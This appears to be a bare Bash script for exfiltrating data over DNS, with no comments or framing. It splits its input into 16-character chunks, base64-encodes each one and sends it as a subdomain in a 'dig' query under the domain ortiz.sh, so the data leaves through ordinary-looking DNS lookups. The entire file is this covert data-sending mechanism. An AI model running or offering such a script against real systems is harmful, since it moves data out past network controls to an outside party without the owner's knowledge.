#!/usr/bin/env bash

set -euxo pipefail
IFS=$'\n'

for string in $(echo "$1" | sed -r 's/(.{16})/\1\n/g')
do
  dig +noedns +nocookie A $(echo "$string" | base64).ortiz.sh @server
done
